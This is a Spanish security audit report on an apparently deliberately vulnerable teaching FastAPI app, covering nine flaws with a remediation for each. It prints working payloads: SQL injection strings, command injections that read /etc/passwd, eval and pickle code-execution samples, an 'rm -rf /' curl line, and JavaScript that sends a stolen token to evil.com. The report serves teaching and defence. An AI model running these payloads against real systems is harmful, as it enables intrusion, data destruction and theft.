# INFORME TÉCNICO DE AUDITORÍA DE SEGURIDAD

---

## INFORMACIÓN GENERAL

**Aplicación Auditada:** `vulnerabilities_project_to_student.py`  
**Fecha de Auditoría:** 28 de Noviembre de 2025  
**Auditor:** Security Team  
**Tipo de Auditoría:** Análisis de Vulnerabilidades de Seguridad  
**Metodología:** OWASP Top 10 2021, ISO/IEC 27001:2022  

---

## RESUMEN EJECUTIVO

Se ha realizado una auditoría técnica exhaustiva de la aplicación FastAPI identificando **9 vulnerabilidades críticas y de alto impacto**. La aplicación presenta múltiples fallas de seguridad que permiten:

- Ejecución remota de código arbitrario (RCE)
- Inyección de comandos del sistema operativo
- Bypass de autenticación mediante SQL Injection
- Exposición de datos sensibles
- Compromiso total del servidor

**NIVEL DE RIESGO GENERAL: CRÍTICO**

### Distribución de Vulnerabilidades por Severidad

| Severidad | Cantidad | Porcentaje |
|-----------|----------|------------|
| Crítica   | 6        | 67%        |
| Alta      | 2        | 22%        |
| Media     | 1        | 11%        |
| **TOTAL** | **9**    | **100%**   |

---

## HALLAZGOS DETALLADOS

---

### VULNERABILIDAD #1: SQL INJECTION

**Clasificación de Riesgo:** <span style="color:red">**CRÍTICO**</span>

#### Detalles Técnicos
- **Tipo de Vulnerabilidad:** A03:2021 - Injection (OWASP)
- **CWE:** CWE-89 - Improper Neutralization of Special Elements used in an SQL Command
- **Ubicación:** Línea 45 del archivo `vulnerabilities_project_to_student.py`
- **Endpoint Afectado:** `POST /login`

#### Código Vulnerable
```python
cursor.execute(
    f"SELECT * FROM users WHERE username='{username}' AND password='{hashed}'"
)
```

#### Descripción de la Vulnerabilidad
El endpoint `/login` construye consultas SQL mediante concatenación directa de strings (f-string) con datos proporcionados por el usuario sin ningún tipo de sanitización o uso de consultas preparadas. Esto permite a un atacante inyectar código SQL arbitrario.

#### Evidencia de Explotación

**Test 1 - Bypass de Autenticación:**
```json
Request: {"username": "admin' OR '1'='1", "password": "cualquiera"}
Consulta SQL generada: SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='...'
Response: HTTP 200 - Token JWT válido emitido
```

**Test 2 - Comentario SQL:**
```json
Request: {"username": "admin'--", "password": "ignorado"}
Consulta SQL generada: SELECT * FROM users WHERE username='admin'--' AND password='...'
Response: HTTP 200 - Password completamente ignorado
```

✅ **VULNERABILIDAD CONFIRMADA** - Archivo de evidencia: `evidencia_1_sql_injection.txt`

#### Impacto para la Organización
- **Confidencialidad:** Acceso no autorizado a cuentas de usuario
- **Integridad:** Modificación de datos en la base de datos
- **Disponibilidad:** Posible eliminación de tablas (DROP TABLE)
- **Cumplimiento:** Violación de requisitos de protección de datos

#### Consecuencias
1. Bypass completo del sistema de autenticación
2. Acceso a cuentas privilegiadas sin credenciales válidas
3. Exfiltración completa de la base de datos
4. Modificación o eliminación de datos críticos
5. Pérdida de confianza de clientes y usuarios

#### Controles ISO/IEC 27001:2022 Relacionados
- **A.8.3** - Gestión de acceso privilegiado
- **A.8.5** - Autenticación segura
- **A.8.8** - Gestión de vulnerabilidades técnicas
- **A.8.28** - Codificación segura

#### Recomendación de Remediación
```python
# CORRECTO: Uso de consultas preparadas (parameterized queries)
cursor.execute(
    "SELECT * FROM users WHERE username=? AND password=?", 
    (username, hashed)
)
```

---

### VULNERABILIDAD #2: OS COMMAND INJECTION

**Clasificación de Riesgo:** <span style="color:red">**CRÍTICO**</span>

#### Detalles Técnicos
- **Tipo de Vulnerabilidad:** A03:2021 - Injection (OWASP)
- **CWE:** CWE-78 - Improper Neutralization of Special Elements used in an OS Command
- **Ubicación:** Línea 67 del archivo `vulnerabilities_project_to_student.py`
- **Endpoint Afectado:** `GET /ping/{host}`

#### Código Vulnerable
```python
completed = subprocess.run(f"ping -c 1 {host}", shell=True, capture_output=True, text=True)
```

#### Descripción de la Vulnerabilidad
El endpoint `/ping/{host}` ejecuta comandos del sistema operativo usando `subprocess.run()` con `shell=True` y concatenación directa del input del usuario. Esto permite inyectar comandos arbitrarios usando separadores de comandos (`;`, `|`, `&&`, etc.).

#### Evidencia de Explotación

**Test 1 - Listar Archivos:**
```bash
Request: GET /ping/127.0.0.1;ls -la
Comando ejecutado: ping -c 1 127.0.0.1;ls -la
```
Resultado: Listado completo de archivos del directorio con permisos y propietarios revelados.

**Test 2 - Leer Código Fuente:**
```bash
Request: GET /ping/127.0.0.1;cat vulnerabilities_project_to_student.py
```
Resultado: Código fuente completo expuesto, incluyendo credenciales hardcodeadas.

**Test 3 - Información del Sistema:**
```bash
Request: GET /ping/127.0.0.1;uname -a
Response: Darwin MacBook-Pro-Miguel.local 24.6.0 Darwin Kernel Version...
```

✅ **VULNERABILIDAD CONFIRMADA** - Archivo de evidencia: `evidencia_2_command_injection.txt`

#### Impacto para la Organización
- **Confidencialidad:** Acceso completo al sistema de archivos
- **Integridad:** Modificación de archivos del sistema
- **Disponibilidad:** Posibilidad de apagar el servidor o eliminar datos
- **Escalación:** Reverse shell, instalación de backdoors

#### Consecuencias
1. Ejecución arbitraria de cualquier comando del sistema operativo
2. Lectura de archivos sensibles (contraseñas, claves privadas, configuraciones)
3. Instalación de malware o backdoors persistentes
4. Compromiso total del servidor y posible pivoting a la red interna
5. Exfiltración masiva de datos

#### Controles ISO/IEC 27001:2022 Relacionados
- **A.8.8** - Gestión de vulnerabilidades técnicas
- **A.8.22** - Segregación de redes
- **A.8.28** - Codificación segura
- **A.5.37** - Documentación de procedimientos operativos

#### Recomendación de Remediación
```python
# CORRECTO: Uso de lista de argumentos sin shell=True
import shlex
completed = subprocess.run(
    ["ping", "-c", "1", shlex.quote(host)], 
    shell=False, 
    capture_output=True, 
    text=True
)
# Adicional: Validar que host sea una IP o dominio válido con regex
```

---

### VULNERABILIDAD #3: REMOTE CODE EXECUTION (RCE) - eval()

**Clasificación de Riesgo:** <span style="color:red">**CRÍTICO**</span>

#### Detalles Técnicos
- **Tipo de Vulnerabilidad:** A03:2021 - Injection (OWASP)
- **CWE:** CWE-94 - Improper Control of Generation of Code ('Code Injection')
- **Ubicación:** Línea 59 del archivo `vulnerabilities_project_to_student.py`
- **Endpoint Afectado:** `POST /eval`

#### Código Vulnerable
```python
expr = data.decode()
result = eval(expr)
return {"result": result}
```

#### Descripción de la Vulnerabilidad
El uso de la función `eval()` en Python con input del usuario es extremadamente peligroso. `eval()` ejecuta cualquier código Python arbitrario, incluyendo importación de módulos, acceso al sistema de archivos, ejecución de comandos del sistema, y más.

#### Evidencia de Explotación

**Test 1 - Importar Módulos:**
```python
Request: POST /eval
Body: __import__('os').listdir('.')
Response: Lista completa de archivos del directorio
```

**Test 2 - Leer Archivos:**
```python
Body: open('vulnerabilities_project_to_student.py').read()[:300]
Response: Código fuente con credenciales expuestas
```

**Test 3 - Ejecutar Comandos:**
```python
Body: __import__('subprocess').check_output('whoami', shell=True).decode()
Response: 'personalwork\n'
```

**Test 4 - Acceso a Variables de Entorno:**
```python
Body: __import__('os').environ.get('HOME', 'N/A')
Response: '/Users/personalwork'
```

✅ **VULNERABILIDAD CONFIRMADA** - Archivo de evidencia: `evidencia_3_rce_eval.txt`

#### Impacto para la Organización
- **Confidencialidad:** Acceso total a memoria, archivos y secretos
- **Integridad:** Modificación de cualquier dato o código
- **Disponibilidad:** Posibilidad de DoS o destrucción del servidor
- **Persistencia:** Instalación de backdoors permanentes

#### Consecuencias
1. **Ejecución de código Python arbitrario** sin restricciones
2. **Reverse shell**: El atacante puede obtener shell interactiva
3. **Robo de credenciales** de bases de datos, APIs, servicios en la nube
4. **Minería de criptomonedas** usando recursos del servidor
5. **Compromiso de la cadena de suministro** si hay acceso a repositorios

#### Controles ISO/IEC 27001:2022 Relacionados
- **A.8.28** - Codificación segura
- **A.8.8** - Gestión de vulnerabilidades técnicas
- **A.8.12** - Prevención de fuga de datos
- **A.5.23** - Seguridad de la información en el uso de servicios en la nube

#### Recomendación de Remediación
```python
# ELIMINAR completamente este endpoint
# Si se necesita evaluar expresiones matemáticas, usar:
import ast

def safe_eval(expr):
    try:
        node = ast.parse(expr, mode='eval')
        # Solo permitir operaciones matemáticas básicas
        for node in ast.walk(node):
            if not isinstance(node, (ast.Expression, ast.Num, ast.BinOp, 
                                     ast.operator, ast.UnaryOp)):
                raise ValueError("Operación no permitida")
        return eval(compile(node, '<string>', 'eval'))
    except:
        raise ValueError("Expresión inválida")
```

---

### VULNERABILIDAD #4: INSECURE DESERIALIZATION (pickle)

**Clasificación de Riesgo:** <span style="color:red">**CRÍTICO**</span>

#### Detalles Técnicos
- **Tipo de Vulnerabilidad:** A08:2021 - Software and Data Integrity Failures (OWASP)
- **CWE:** CWE-502 - Deserialization of Untrusted Data
- **Ubicación:** Línea 76 del archivo `vulnerabilities_project_to_student.py`
- **Endpoint Afectado:** `POST /deserialize`

#### Código Vulnerable
```python
blob = await request.body()
obj = pickle.loads(blob)
return {"deserialized": str(obj)}
```

#### Descripción de la Vulnerabilidad
El módulo `pickle` de Python permite la serialización de objetos, pero es inherentemente inseguro cuando se deserializan datos no confiables. Un atacante puede crear objetos pickle maliciosos que ejecuten código arbitrario durante el proceso de deserialización usando el método `__reduce__`.

#### Evidencia de Explotación

Se creó una clase maliciosa que ejecuta comandos del sistema durante la deserialización:

```python
class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ('echo "VULNERABLE" > /tmp/pwned.txt',))
```

Resultado: Comando ejecutado exitosamente en el servidor durante `pickle.loads()`.

✅ **VULNERABILIDAD CONFIRMADA** - Archivo de evidencia: `evidencia_4_deserialization.txt`

#### Impacto para la Organización
- **Confidencialidad:** Ejecución de código sin autenticación previa
- **Integridad:** Modificación de archivos del sistema
- **Disponibilidad:** Posible destrucción del servidor
- **Persistencia:** Instalación de backdoors

#### Consecuencias
1. **RCE sin autenticación** - No se requiere login
2. **Bypass completo de seguridad** - No hay validación del payload
3. **Instalación de malware persistente**
4. **Exfiltración de datos** en segundo plano
5. **Botnet**: El servidor puede ser incorporado a una red de bots

#### Controles ISO/IEC 27001:2022 Relacionados
- **A.8.28** - Codificación segura
- **A.8.24** - Uso de criptografía
- **A.8.8** - Gestión de vulnerabilidades técnicas
- **A.5.14** - Transferencia de información

#### Recomendación de Remediación
```python
# ELIMINAR pickle completamente
# Alternativas seguras:
import json

# Opción 1: JSON (solo tipos básicos)
data = json.loads(request_data)

# Opción 2: MessagePack (más eficiente que JSON)
import msgpack
data = msgpack.unpackb(request_data)

# Opción 3: Protocol Buffers o JSON Schema con validación estricta
```

---

### VULNERABILIDAD #5: PATH TRAVERSAL / ARBITRARY FILE UPLOAD

**Clasificación de Riesgo:** <span style="color:red">**ALTO**</span>

#### Detalles Técnicos
- **Tipo de Vulnerabilidad:** A01:2021 - Broken Access Control (OWASP)
- **CWE:** CWE-22 - Improper Limitation of a Pathname to a Restricted Directory
- **Ubicación:** Línea 90 del archivo `vulnerabilities_project_to_student.py`
- **Endpoint Afectado:** `POST /upload`

#### Código Vulnerable
```python
contents = await file.read()
with open(f"./uploads/{file.filename}", "wb") as f:
    f.write(contents)
```

#### Descripción de la Vulnerabilidad
El endpoint confía completamente en el nombre de archivo proporcionado por el usuario (`file.filename`) sin validación alguna. Esto permite:
1. **Path Traversal:** Usar `../` para escribir fuera del directorio `uploads/`
2. **Sin validación de tipo:** Se aceptan archivos ejecutables (.sh, .exe, .py)
3. **Sin límite de tamaño:** Posible DoS por llenado de disco
4. **Sobrescritura de archivos:** Pueden sobrescribirse archivos existentes

#### Evidencia de Explotación

**Test 1 - Path Traversal:**
```
Filename: ../../../etc/passwd (en sistemas Linux)
Filename: ../traversal_test.txt (en directorio raíz)
Resultado: Archivo creado fuera del directorio uploads/
```

**Test 2 - Upload de Ejecutable:**
```
Filename: backdoor.sh
Content: #!/bin/bash\necho "Backdoor instalado"
Resultado: Script shell subido exitosamente sin restricción
```

✅ **VULNERABILIDAD CONFIRMADA** - Archivo de evidencia: `evidencia_5_path_traversal.txt`

#### Impacto para la Organización
- **Confidencialidad:** Sobrescritura de archivos de configuración sensibles
- **Integridad:** Modificación de archivos críticos del sistema
- **Disponibilidad:** Llenado del disco (DoS)
- **Ejecución:** Si los archivos subidos son accesibles vía web, RCE

#### Consecuencias
1. **Sobrescritura de archivos del sistema** (/etc/passwd, configuraciones)
2. **Upload de web shells** para acceso remoto
3. **Distribución de malware** a otros usuarios que descarguen archivos
4. **Agotamiento de recursos** del servidor
5. **Hosting de contenido ilegal** usando la infraestructura de la organización

#### Controles ISO/IEC 27001:2022 Relacionados
- **A.8.10** - Supresión de información
- **A.5.14** - Transferencia de información
- **A.8.28** - Codificación segura
- **A.5.37** - Documentación de procedimientos operativos

#### Recomendación de Remediación
```python
import os
import uuid
from pathlib import Path

@app.post("/upload")
async def upload(file: UploadFile = File(...)):
    # Validar tipo de archivo
    allowed_extensions = {'.txt', '.pdf', '.jpg', '.png'}
    file_ext = Path(file.filename).suffix.lower()
    if file_ext not in allowed_extensions:
        raise HTTPException(400, "Tipo de archivo no permitido")
    
    # Validar tamaño (ej: 5MB)
    contents = await file.read()
    if len(contents) > 5 * 1024 * 1024:
        raise HTTPException(400, "Archivo demasiado grande")
    
    # Generar nombre seguro (eliminar path traversal)
    safe_filename = f"{uuid.uuid4()}{file_ext}"
    upload_path = Path("./uploads") / safe_filename
    
    # Asegurar que el path esté dentro de uploads/
    if not str(upload_path.resolve()).startswith(str(Path("./uploads").resolve())):
        raise HTTPException(400, "Nombre de archivo inválido")
    
    with open(upload_path, "wb") as f:
        f.write(contents)
    
    return {"filename": safe_filename}
```

---

### VULNERABILIDAD #6: SENSITIVE DATA EXPOSURE - Logging de Credenciales

**Clasificación de Riesgo:** <span style="color:red">**ALTO**</span>

#### Detalles Técnicos
- **Tipo de Vulnerabilidad:** A02:2021 - Cryptographic Failures (OWASP)
- **CWE:** CWE-532 - Information Exposure Through Log Files
- **Ubicación:** Línea 41 del archivo `vulnerabilities_project_to_student.py`
- **Endpoint Afectado:** `POST /login`

#### Código Vulnerable
```python
logging.info(f"Login attempt user={username} pass={password}")
```

#### Descripción de la Vulnerabilidad
La aplicación registra las credenciales de usuario (username y password) en texto plano en los logs. Si un atacante obtiene acceso a los archivos de log (por ejemplo, mediante otra vulnerabilidad o acceso físico), puede obtener todas las contraseñas de los usuarios.

#### Vulnerabilidades Relacionadas en el Mismo Archivo

**Líneas 11-13: Secretos Hardcodeados**
```python
DB_USER = "admin"
DB_PASSWORD = "P@ssw0rd!"
JWT_SECRET = "abc"
```

✅ **VULNERABILIDAD CONFIRMADA** - Archivo de evidencia: `evidencia_6_data_exposure.txt`

#### Impacto para la Organización
- **Confidencialidad:** Exposición masiva de contraseñas de usuarios
- **Cumplimiento:** Violación de GDPR, LOPD, PCI-DSS
- **Reputación:** Pérdida de confianza si se hace pública
- **Legal:** Posibles multas regulatorias

#### Consecuencias
1. **Compromiso de todas las cuentas** si los logs son accesibles
2. **Reutilización de contraseñas**: Los usuarios usan las mismas contraseñas en otros servicios
3. **Auditorías negativas**: Incumplimiento de normativas de protección de datos
4. **Responsabilidad legal** por negligencia en el manejo de datos personales
5. **Secretos hardcodeados** permite a cualquiera con acceso al código comprometer la aplicación

#### Controles ISO/IEC 27001:2022 Relacionados
- **A.5.33** - Registros de protección
- **A.8.9** - Gestión de configuración
- **A.8.11** - Enmascaramiento de datos
- **A.5.34** - Privacidad y protección de información de identificación personal

#### Recomendación de Remediación
```python
# CORRECTO: No registrar información sensible
logging.info(f"Login attempt user={username}")  # SIN password

# Usar variables de entorno para secretos
import os
DB_USER = os.getenv("DB_USER")
DB_PASSWORD = os.getenv("DB_PASSWORD")
JWT_SECRET = os.getenv("JWT_SECRET")

# Validar que existan
if not all([DB_USER, DB_PASSWORD, JWT_SECRET]):
    raise ValueError("Faltan variables de entorno críticas")
```

---

### VULNERABILIDAD #7: CRYPTOGRAPHIC FAILURES - MD5 y Algoritmos Débiles

**Clasificación de Riesgo:** <span style="color:red">**CRÍTICO**</span>

#### Detalles Técnicos
- **Tipo de Vulnerabilidad:** A02:2021 - Cryptographic Failures (OWASP)
- **CWE:** CWE-327 - Use of a Broken or Risky Cryptographic Algorithm
- **Ubicación:** Múltiples líneas (32-33, 83, 13)
- **Endpoints Afectados:** `/login`, `/random-token`

#### Código Vulnerable

**1. MD5 para Passwords (Líneas 32-33):**
```python
def md5_hash(password: str) -> str:
    return hashlib.md5(password.encode()).hexdigest()
```

**2. random() para Tokens (Línea 83):**
```python
token = str(random.random())
```

**3. JWT Secret Débil (Línea 13):**
```python
JWT_SECRET = "abc"
```

#### Descripción de las Vulnerabilidades

**MD5:**
- MD5 fue diseñado para velocidad, no para seguridad
- Vulnerable a ataques de colisión
- Rainbow tables disponibles públicamente
- GPUs modernas pueden probar billones de hashes por segundo

**random.random():**
- Usa Mersenne Twister (PRNG predecible)
- No es criptográficamente seguro
- El estado interno puede deducirse con suficientes muestras
- Permite predecir futuros tokens

**JWT Secret "abc":**
- Trivialmente descubrible por fuerza bruta
- Permite forjar tokens JWT para cualquier usuario
- Escalación de privilegios sin límites

✅ **VULNERABILIDAD CONFIRMADA** - Archivo de evidencia: `evidencia_7_weak_crypto.txt`

#### Impacto para la Organización
- **Confidencialidad:** Passwords fácilmente crackeables
- **Autenticación:** Tokens predecibles y falsificables
- **Integridad:** Tokens JWT forjables
- **No repudio:** Imposible confiar en la identidad de los usuarios

#### Consecuencias
1. **Crackeo de passwords** en minutos u horas con herramientas estándar (hashcat, John the Ripper)
2. **Predicción de tokens** de sesión, permitiendo secuestro de sesiones
3. **Falsificación de identidad** mediante tokens JWT forjados
4. **Bypass completo de autenticación**
5. **Compromiso de múltiples sistemas** si las contraseñas se reutilizan

#### Controles ISO/IEC 27001:2022 Relacionados
- **A.8.24** - Uso de criptografía
- **A.5.10** - Uso aceptable de la información y otros activos asociados
- **A.8.5** - Autenticación segura
- **A.8.28** - Codificación segura

#### Recomendación de Remediación
```python
# 1. CORRECTO: Usar Argon2 o bcrypt para passwords
from argon2 import PasswordHasher
ph = PasswordHasher()

def hash_password(password: str) -> str:
    return ph.hash(password)

def verify_password(stored_hash: str, password: str) -> bool:
    try:
        ph.verify(stored_hash, password)
        return True
    except:
        return False

# 2. CORRECTO: Usar secrets para tokens
import secrets
token = secrets.token_urlsafe(32)

# 3. CORRECTO: JWT Secret fuerte
import secrets
JWT_SECRET = secrets.token_hex(32)  # Generar una vez y guardar en variable de entorno
```

---

### VULNERABILIDAD #8: SECURITY MISCONFIGURATION - CORS Permisivo

**Clasificación de Riesgo:** <span style="color:orange">**MEDIO-ALTO**</span>

#### Detalles Técnicos
- **Tipo de Vulnerabilidad:** A05:2021 - Security Misconfiguration (OWASP)
- **CWE:** CWE-942 - Overly Permissive Cross-domain Whitelist
- **Ubicación:** Líneas 17-23 del archivo `vulnerabilities_project_to_student.py`
- **Componente Afectado:** Middleware CORS

#### Código Vulnerable
```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],           # Permite CUALQUIER origen
    allow_credentials=True,         # Permite envío de cookies/auth
    allow_methods=["*"],            # Permite TODOS los métodos
    allow_headers=["*"],            # Permite TODOS los headers
)
```

#### Descripción de la Vulnerabilidad
La configuración de CORS (Cross-Origin Resource Sharing) permite que cualquier sitio web (`allow_origins=["*"]`) realice peticiones a esta API y lea las respuestas. Combinado con `allow_credentials=True`, esto facilita ataques CSRF y exfiltración de datos sensibles.

#### Escenario de Ataque

1. **Víctima** inicia sesión en la aplicación vulnerable (http://127.0.0.1:8000)
2. **Víctima** visita sitio malicioso (https://evil.com)
3. **JavaScript en evil.com** realiza:
```javascript
fetch('http://127.0.0.1:8000/login', {
  method: 'POST',
  credentials: 'include',
  body: JSON.stringify({username: 'victim', password: 'leaked'})
})
.then(r => r.json())
.then(data => {
  // Atacante recibe el token JWT de la víctima
  fetch('https://evil.com/steal', {method: 'POST', body: data.token});
});
```

✅ **VULNERABILIDAD CONFIRMADA** - Archivo de evidencia: `evidencia_8_cors.txt`

#### Impacto para la Organización
- **Confidencialidad:** Exfiltración de tokens y datos sensibles
- **Integridad:** CSRF facilitado para modificación de datos
- **Disponibilidad:** Posibles ataques DDoS desde múltiples orígenes
- **Privacidad:** Violación de políticas de privacidad

#### Consecuencias
1. **Exfiltración de tokens JWT** desde navegadores de usuarios legítimos
2. **CSRF (Cross-Site Request Forgery)** para realizar acciones no autorizadas
3. **Robo de sesiones activas**
4. **Phishing facilitado** con peticiones desde dominios maliciosos
5. **Distribución de malware** aprovechando la confianza en la API

#### Controles ISO/IEC 27001:2022 Relacionados
- **A.8.20** - Seguridad de redes
- **A.8.22** - Segregación de redes
- **A.5.14** - Transferencia de información
- **A.8.28** - Codificación segura

#### Recomendación de Remediación
```python
# CORRECTO: Whitelist explícita de orígenes confiables
app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "https://app.miempresa.com",
        "https://admin.miempresa.com"
    ],
    allow_credentials=True,
    allow_methods=["GET", "POST"],  # Solo métodos necesarios
    allow_headers=["Content-Type", "Authorization"],  # Solo headers necesarios
    max_age=3600  # Cache de preflight
)

# Si es API pública sin credenciales:
allow_origins=["*"]
allow_credentials=False  # IMPORTANTE: False si origins es "*"
```

---

### VULNERABILIDAD #9: BROKEN ACCESS CONTROL - Ausencia de Autenticación

**Clasificación de Riesgo:** <span style="color:red">**CRÍTICO**</span>

#### Detalles Técnicos
- **Tipo de Vulnerabilidad:** A01:2021 - Broken Access Control (OWASP)
- **CWE:** CWE-306 - Missing Authentication for Critical Function
- **Ubicación:** Todos los endpoints (Líneas 54, 64, 72, 81, 86)
- **Endpoints Afectados:** `/eval`, `/ping`, `/deserialize`, `/random-token`, `/upload`

#### Descripción de la Vulnerabilidad
La aplicación genera tokens JWT en el endpoint `/login`, pero **NUNCA valida** estos tokens en ningún otro endpoint. Todas las funciones críticas son accesibles sin autenticación:

| Endpoint | Método | Función Crítica | Auth Requerida |
|----------|--------|-----------------|----------------|
| `/eval` | POST | Ejecución de código | ❌ NO |
| `/ping/{host}` | GET | Comandos del sistema | ❌ NO |
| `/deserialize` | POST | Deserialización RCE | ❌ NO |
| `/upload` | POST | Subida de archivos | ❌ NO |
| `/random-token` | GET | Generación de tokens | ❌ NO |

#### Evidencia de Explotación

Todas las peticiones a endpoints críticos fueron exitosas **sin enviar ningún token JWT o credencial**:

```bash
# Sin autenticación, cualquiera puede:
curl -X POST http://127.0.0.1:8000/eval -d "__import__('os').system('rm -rf /')"
curl -X GET http://127.0.0.1:8000/ping/x;cat /etc/passwd
curl -X POST http://127.0.0.1:8000/deserialize -d "[payload_malicioso]"
```

✅ **VULNERABILIDAD CONFIRMADA** - Archivo de evidencia: `evidencia_9_missing_auth.txt`

#### Impacto para la Organización
- **Confidencialidad:** Acceso completo sin identificación
- **Integridad:** Modificaciones sin trazabilidad
- **Disponibilidad:** Destrucción sin responsables
- **No repudio:** Imposible atribuir acciones a usuarios
- **Cumplimiento:** Incumplimiento total de controles de acceso

#### Consecuencias
1. **Exposición pública** de todas las funcionalidades peligrosas
2. **Botnet**: El endpoint `/eval` puede ser usado masivamente para minado de criptomonedas
3. **Imposibilidad de auditoría** - No se sabe quién hizo qué
4. **Ataques automatizados** por bots de Internet
5. **Responsabilidad legal** por permitir actividades ilícitas sin control

#### Controles ISO/IEC 27001:2022 Relacionados
- **A.5.15** - Control de acceso
- **A.5.16** - Gestión de identidades
- **A.5.17** - Información de autenticación
- **A.8.3** - Gestión de acceso privilegiado
- **A.8.5** - Autenticación segura

#### Recomendación de Remediación
```python
from fastapi import Depends, HTTPException
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
import jwt

security = HTTPBearer()

def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
    token = credentials.credentials
    try:
        payload = jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
        return payload
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Token inválido")

# Aplicar a TODOS los endpoints críticos:
@app.post("/eval")
async def run_eval(request: Request, user = Depends(verify_token)):
    # user contiene la información del usuario autenticado
    # ... resto del código
    pass

# Mejor aún: Implementar roles y permisos
from enum import Enum

class Role(str, Enum):
    ADMIN = "admin"
    USER = "user"

def require_role(required_role: Role):
    def role_checker(user = Depends(verify_token)):
        if user.get("role") != required_role:
            raise HTTPException(403, "Permisos insuficientes")
        return user
    return role_checker

@app.post("/eval")
async def run_eval(request: Request, user = Depends(require_role(Role.ADMIN))):
    # Solo administradores pueden acceder
    pass
```

---

## ANÁLISIS DE RIESGO CONSOLIDADO

### Matriz de Riesgo

| ID | Vulnerabilidad | Probabilidad | Impacto | Riesgo Final | Prioridad |
|----|----------------|--------------|---------|--------------|-----------|
| 1 | SQL Injection | Alta | Crítico | **CRÍTICO** | 🔴 P0 |
| 2 | OS Command Injection | Alta | Crítico | **CRÍTICO** | 🔴 P0 |
| 3 | RCE - eval() | Alta | Crítico | **CRÍTICO** | 🔴 P0 |
| 4 | Insecure Deserialization | Alta | Crítico | **CRÍTICO** | 🔴 P0 |
| 5 | Path Traversal | Media | Alto | **ALTO** | 🟠 P1 |
| 6 | Sensitive Data Exposure | Alta | Alto | **ALTO** | 🟠 P1 |
| 7 | Cryptographic Failures | Alta | Crítico | **CRÍTICO** | 🔴 P0 |
| 8 | CORS Misconfiguration | Media | Medio | **MEDIO** | 🟡 P2 |
| 9 | Missing Authentication | Alta | Crítico | **CRÍTICO** | 🔴 P0 |

### Probabilidad
- **Alta:** Explotación trivial, herramientas públicas disponibles, no requiere skills avanzados
- **Media:** Requiere conocimientos técnicos pero es factible

### Impacto
- **Crítico:** RCE, compromiso total del servidor, pérdida masiva de datos
- **Alto:** Exposición de datos sensibles, bypass de autenticación
- **Medio:** Configuración insegura que facilita otros ataques

---

## CUMPLIMIENTO ISO/IEC 27001:2022

### Controles del Anexo A Afectados

| Control | Descripción | Vulnerabilidades Relacionadas |
|---------|-------------|-------------------------------|
| **A.5.15** | Control de acceso | #9 Missing Authentication |
| **A.5.16** | Gestión de identidades | #1 SQL Injection, #9 |
| **A.5.17** | Información de autenticación | #6 Data Exposure, #7 Weak Crypto |
| **A.5.33** | Registros de protección | #6 Logging Credentials |
| **A.5.34** | Privacidad y protección PII | #6 Data Exposure |
| **A.8.3** | Gestión de acceso privilegiado | #1, #9 |
| **A.8.5** | Autenticación segura | #1, #7, #9 |
| **A.8.8** | Gestión de vulnerabilidades técnicas | TODAS |
| **A.8.9** | Gestión de configuración | #6 Hardcoded Secrets, #8 CORS |
| **A.8.11** | Enmascaramiento de datos | #6 |
| **A.8.12** | Prevención de fuga de datos | #3, #6 |
| **A.8.20** | Seguridad de redes | #8 CORS |
| **A.8.24** | Uso de criptografía | #7 Cryptographic Failures |
| **A.8.28** | Codificación segura | TODAS |

### Recomendaciones de Cumplimiento

1. **Implementar revisión de código seguro** (A.8.28)
2. **Establecer pipeline de seguridad CI/CD** con SAST/DAST
3. **Capacitación obligatoria** en desarrollo seguro para el equipo
4. **Gestión de secretos** con herramientas como HashiCorp Vault o AWS Secrets Manager
5. **Auditorías de seguridad** periódicas (trimestral mínimo)
6. **Logging y monitoreo** de actividades sospechosas (SIEM)

---

## MAPEO CON OWASP TOP 10 2021

| Ranking OWASP | Categoría | Vulnerabilidades Identificadas |
|---------------|-----------|--------------------------------|
| **A01:2021** | Broken Access Control | #5 Path Traversal, #9 Missing Auth |
| **A02:2021** | Cryptographic Failures | #6 Data Exposure, #7 Weak Crypto |
| **A03:2021** | Injection | #1 SQL Injection, #2 Command Injection, #3 RCE |
| **A05:2021** | Security Misconfiguration | #8 CORS, #6 Hardcoded Secrets |
| **A08:2021** | Software and Data Integrity Failures | #4 Insecure Deserialization |

**Cobertura:** 5 de las 10 categorías de OWASP Top 10 están presentes con múltiples instancias.

---

## RECOMENDACIONES GENERALES

### Acciones Inmediatas (24-48 horas) - P0

1. **DESCONECTAR** la aplicación de Internet inmediatamente
2. **ELIMINAR** los endpoints `/eval`, `/deserialize` por completo
3. **IMPLEMENTAR** autenticación obligatoria en TODOS los endpoints
4. **CAMBIAR** todas las credenciales hardcodeadas
5. **ROTAR** el JWT secret inmediatamente
6. **AUDITAR** logs para detectar posibles compromisos previos

### Acciones a Corto Plazo (1-2 semanas) - P1

1. Reemplazar MD5 por Argon2 o bcrypt
2. Implementar consultas preparadas (SQL)
3. Sanitizar inputs del endpoint `/ping` o eliminarlo
4. Implementar validación estricta en `/upload`
5. Eliminar logging de contraseñas
6. Configurar CORS con whitelist específica
7. Implementar rate limiting y WAF

### Acciones a Medio Plazo (1 mes) - P2

1. Implementar sistema de roles y permisos (RBAC)
2. Integrar SAST en CI/CD (ej: Bandit, Semgrep)
3. Implementar DAST periódico (ej: OWASP ZAP)
4. Configurar secrets manager (Vault, AWS Secrets)
5. Implementar logging y monitoreo centralizado (SIEM)
6. Establecer proceso de security code review
7. Capacitar al equipo en OWASP Top 10 y desarrollo seguro

### Acciones a Largo Plazo (3-6 meses)

1. Certificación ISO 27001
2. Implementar programa de Bug Bounty
3. Penetration testing externo
4. Implementar Security Champions en equipos
5. Establecer SDL (Security Development Lifecycle)

---

## HERRAMIENTAS RECOMENDADAS

### SAST (Static Application Security Testing)
- **Bandit** - Análisis estático para Python
- **Semgrep** - Patrones de seguridad personalizables
- **SonarQube** - Plataforma completa de calidad y seguridad

### DAST (Dynamic Application Security Testing)
- **OWASP ZAP** - Proxy de interceptación y scanner (Open Source)
- **Burp Suite** - Herramienta profesional de pentesting
- **Nuclei** - Scanner de vulnerabilidades con templates

### Gestión de Secretos
- **HashiCorp Vault** - Gestión centralizada de secretos
- **AWS Secrets Manager** - Solución cloud
- **Doppler** - Gestión de variables de entorno seguras

### Protección en Runtime
- **ModSecurity** - WAF (Web Application Firewall)
- **Fail2ban** - Protección contra fuerza bruta
